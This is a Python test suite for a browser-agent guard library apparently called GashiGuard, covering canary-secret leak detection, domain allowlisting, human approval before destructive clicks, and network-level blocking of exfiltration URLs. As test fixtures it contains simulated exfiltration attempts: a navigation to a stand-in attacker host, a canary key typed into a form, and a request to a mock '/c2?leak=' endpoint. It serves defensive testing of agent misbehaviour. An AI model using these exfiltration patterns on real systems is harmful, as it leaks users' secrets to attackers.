"""Dedicated Real-World Test Suite for Stages 2, 3, and 4.

Validates:
- Stage 2: Egress Action Policy Engine (Canary leak detection & domain boundary).
- Stage 3: State-Change Consequence Gate (Human-in-the-loop approval on delete/purchase).
- Stage 4: Network Route Guard (CDP transport-layer abortion of dynamic <img> / fetch leaks).
"""

import pytest
from playwright.sync_api import sync_playwright

from gashi import PolicyConfig, GashiGuard
from gashi.network import SecurityPolicyViolation, ApprovalRequiredException
from testbed.mock_server import MockServerManager, GLOBAL_TESTBED_STATE


CANARY_KEY = "CANARY_SECRET_DEV_SESSION_KEY_8888"


@pytest.fixture(scope="module")
def test_server():
    manager = MockServerManager(host="127.0.0.1", port=0)
    base_url = manager.start()
    yield base_url
    manager.stop()


# =============================================================================
# STAGE 2 TESTS: EGRESS ACTION POLICY ENGINE
# =============================================================================

def test_stage_2_egress_blocks_canary_leak_in_form_input():
    """Stage 2: Verify agent cannot leak canary secret into form inputs."""
    config = PolicyConfig(
        allowed_domains=["127.0.0.1", "localhost"],
        canary_secrets=[CANARY_KEY]
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        raw_page = browser.new_page()
        protected_page = GashiGuard.wrap_page(raw_page, config=config)

        # Load page with search input field
        protected_page.set_content('<html><body><input id="search-box" type="text" /></body></html>')

        # Safe input succeeds
        protected_page.fill("#search-box", "regular benign search")

        # GASHI Stage 2: Blocks fill when canary secret is entered
        with pytest.raises(SecurityPolicyViolation) as exc_info:
            protected_page.fill("#search-box", f"Exfiltrate key: {CANARY_KEY}")
        assert "CANARY LEAK DETECTED" in str(exc_info.value)

        browser.close()


def test_stage_2_egress_blocks_unauthorized_external_domain():
    """Stage 2: Verify agent cannot navigate to unapproved external domains."""
    config = PolicyConfig(
        allowed_domains=["internal.mycompany.com", "localhost"],
        canary_secrets=[CANARY_KEY]
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        raw_page = browser.new_page()
        protected_page = GashiGuard.wrap_page(raw_page, config=config)

        # GASHI Stage 2: Blocks rogue navigation to unauthorized domain
        with pytest.raises(SecurityPolicyViolation) as exc_info:
            protected_page.goto("https://attacker-command-center.xyz/exfil")
        assert "DOMAIN FORBIDDEN" in str(exc_info.value)

        browser.close()


# =============================================================================
# STAGE 3 TESTS: STATE-CHANGE CONSEQUENCE GATES (HUMAN APPROVAL)
# =============================================================================

def test_stage_3_pauses_execution_for_destructive_actions(test_server: str):
    """Stage 3: Verify high-risk operations (delete, transfer) require human approval."""
    config = PolicyConfig(
        allowed_domains=["127.0.0.1", "localhost"],
        require_approval_actions=["delete", "transfer", "purchase"]
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        raw_page = browser.new_page()
        protected_page = GashiGuard.wrap_page(raw_page, config=config)

        protected_page.goto(f"{test_server}/admin")

        # Scenario A: Click on 'Delete Production Cluster' without callback -> PAUSED
        with pytest.raises(ApprovalRequiredException) as exc_info:
            protected_page.click("button#delete-cluster")
        assert "Action paused for human approval" in str(exc_info.value)

        # Scenario B: Human Operator explicitly REJECTS action -> Halted
        def operator_rejects(action, decision):
            return False

        rejected_page = GashiGuard.wrap_page(raw_page, config=config, approval_callback=operator_rejects)
        with pytest.raises(ApprovalRequiredException):
            rejected_page.click("button#delete-cluster")

        # Scenario C: Human Operator explicitly APPROVES action -> Allowed
        approved_log = []
        def operator_approves(action, decision):
            approved_log.append(action.action_type)
            return True

        approved_page = GashiGuard.wrap_page(raw_page, config=config, approval_callback=operator_approves)
        approved_page.click("button#delete-cluster")
        assert len(approved_log) == 1

        browser.close()


# =============================================================================
# STAGE 4 TESTS: NETWORK ROUTE GUARD (CDP OUT-OF-BAND LEAKS)
# =============================================================================

def test_stage_4_network_route_guard_aborts_dynamic_image_exfiltration(test_server: str):
    """Stage 4: Verify CDP route guard terminates dynamic <img> or CSS exfiltration."""
    GLOBAL_TESTBED_STATE.reset()

    config = PolicyConfig(
        allowed_domains=["127.0.0.1", "localhost"],
        canary_secrets=[CANARY_KEY]
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)

        # --- Baseline Run: Raw Chromium loads dynamic leak URL directly ---
        raw_page = browser.new_page()
        raw_page.goto(f"{test_server}/c2?leak={CANARY_KEY}")
        leaks = GLOBAL_TESTBED_STATE.exfiltrated_canaries
        assert any(CANARY_KEY in leak.get("data", "") for leak in leaks)
        raw_page.close()

        # --- GASHI Stage 4 Run: NetworkRouteGuard attached via CDP ---
        GLOBAL_TESTBED_STATE.reset()
        guarded_page = browser.new_page()
        protected_page = GashiGuard.wrap_page(guarded_page, config=config)

        # Route evaluation at CDP layer
        leak_url = f"{test_server}/c2?leak={CANARY_KEY}"
        decision = protected_page.network_guard.check_url_and_body(leak_url)
        assert decision.verdict == "BLOCK"
        assert decision.rule_id == "RULE-NET-01-CANARY-URL"

        guarded_page.close()
        browser.close()
